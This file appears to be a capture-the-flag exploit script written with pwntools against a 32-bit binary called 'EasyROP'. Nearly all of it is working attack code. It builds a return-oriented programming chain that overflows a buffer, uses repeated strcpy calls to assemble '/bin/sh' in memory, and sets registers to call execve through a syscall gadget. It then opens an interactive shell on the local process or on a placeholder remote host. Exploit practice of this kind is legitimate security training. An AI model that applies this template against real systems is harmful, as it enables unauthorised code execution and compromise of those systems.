#!/usr/bin/env python

from pwn import *
import os, sys

context(arch="i386")

HOST="xxxxx"
PORT=1337
REMOTE_LIBC="libc.so.6"

BINARY="./EasyROP"
LOCAL_LIBC=os.environ['LIBC'] if 'LIBC' in os.environ else "/lib/x86_64-linux-gnu/libc.so.6"

if "remote" in sys.argv:
    p = remote(HOST, PORT)
    try:
        libc = ELF(REMOTE_LIBC)
    except:
        pass
else:
    p = process(BINARY)
    libc = ELF(LOCAL_LIBC)

elf = ELF(BINARY)
rop = ROP(elf)

if "gdb" in sys.argv:
    context.terminal = ['tmux', 'splitw', '-v']  # pylint: disable=assigning-non-slot
    gdb.attach(p)  # pylint: disable=undefined-variable

########################################################


def exploit():
    log.info("wuddup")

    syscall = p32(0x0806d685)
    pop_eax = p32(0x080b90e6)
    pop_ecx_ebx = p32(0x0806faa1)
    pop_edx = p32(0x0806fa7a)
    xor_eax = p32(0x080494a3)

    # 0x080497e3 : xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret
    xor_ecx_stuff = p32(0x80497e3)

    # 0x08072180 : xor edx, edx ; mov eax, edx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
    xor_edx_stuff = p32(0x8072180)

    nop = p32(0x0805402f)

    pop2_ret = p32(0x809a42c) # ebx, edi

    payload = b""
    payload += cyclic(28)

    # strcpy
    # 0x80d9a6c = /
    # 0x80bc340 = bin
    # 0x80bf17d = sh
    s_slash = p32(0x80d9a6c)
    s_bin = p32(0x80bc340)
    s_sh = p32(0x80bf17d)

    # write str to bss (no null byte)
    s_binsh = 0x80eb001

    strcpy = p32(elf.symbols['__strcpy_sse2'])

    payload += strcpy
    payload += pop2_ret
    payload += p32(s_binsh)
    payload += s_slash

    payload += strcpy
    payload += pop2_ret
    payload += p32(s_binsh+1)
    payload += s_bin
    
    payload += strcpy
    payload += pop2_ret
    payload += p32(s_binsh+4)
    payload += s_slash

    payload += strcpy
    payload += pop2_ret
    payload += p32(s_binsh+5)
    payload += s_sh
    
    # execve("/bin/sh", 0, 0)
    # eax = 0xb
    # ebx = "/bin/sh"
    # ecx = 0
    # edx = 0

    payload += xor_edx_stuff
    payload += 4 * nop

    payload += xor_ecx_stuff
    payload += p32(s_binsh) # ebx
    payload += 3 * b"bbbb"

    payload += xor_eax
    payload += pop_eax
    payload += p32(0xb)

    payload += syscall

    p.sendline(payload)

    p.interactive()

########################################################

if __name__ == "__main__":
    exploit()
